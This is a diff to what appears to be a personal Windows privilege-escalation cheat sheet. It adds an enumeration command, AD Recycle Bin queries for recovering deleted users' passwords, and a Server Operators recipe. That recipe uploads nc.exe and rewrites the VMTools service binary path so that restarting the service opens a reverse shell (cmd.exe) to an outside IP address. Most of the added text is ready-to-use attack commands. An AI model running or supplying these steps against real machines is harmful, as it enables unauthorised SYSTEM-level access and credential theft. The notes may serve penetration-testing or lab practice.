@@ -13,6 +13,7 @@
 
 ## Basic enum
 - ``` whoami /groups ```  display all groups our current user is a member
+- ``` whoami /all ``` Enum All [Gigachad!]
 - ``` Get-LocalUser ```  obtain a list of all local users 
 - ``` Get-LocalGroup ``` existing groups in local
 - ``` Get-LocalGroupMember {Group_name} ``` list users under a group
@@ -209,3 +210,17 @@
    ```
    1. c:\users\{name}\APPDATA\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt
    ```
+
+# Local Group privesc
+## Server Operators role in local
+- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
+1. Try see which service can abuse ``` services ```
+   ```
+    upload nc.exe
+    sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
+    sc.exe stop VMTools
+    sc.exe start VMTools
+   ```
+## AD Recycle Bin role in local
+1. ``` Get-ADObject -SearchBase "CN=Deleted Objects,DC={DC},DC=Local" Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties * ``` find interesting deleted users password & map the password to which account (you get earlier from enumuserlist) | maybe administrator also
+2. ``` Get-RecoverableItems ``` 
